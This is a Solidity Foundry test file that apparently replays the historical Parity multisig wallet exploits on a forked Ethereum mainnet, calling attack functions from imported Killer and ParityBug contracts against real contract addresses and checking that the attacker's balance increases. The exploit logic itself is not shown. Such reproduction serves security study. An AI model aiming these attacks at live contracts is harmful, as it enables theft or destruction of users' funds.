// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/Killer.sol";
import "src/ParityBug.sol";

contract ExploitsTest is Test {
    Killer killer;
    ParityBug parityBug;

    function setUp() public {
        killer = new Killer();
        parityBug = new ParityBug();
    }

    // forge test -vvvv --fork-url wss://eth.drpc.org --fork-block-number 4043801 --match-test testWithdrawal
    function testWithdrawal() public {
        uint256 balanceBefore = address(parityBug).balance;

        parityBug.attack(0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e);

        uint256 balanceAfter = address(parityBug).balance;

        assertEq(balanceBefore < balanceAfter, true);
    }

    // forge test -vvvv --fork-url wss://eth.drpc.org --fork-block-number 4501735 --match-test testKillParity
    function testKillParity() public {
        killer.attack(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4);
    }
}
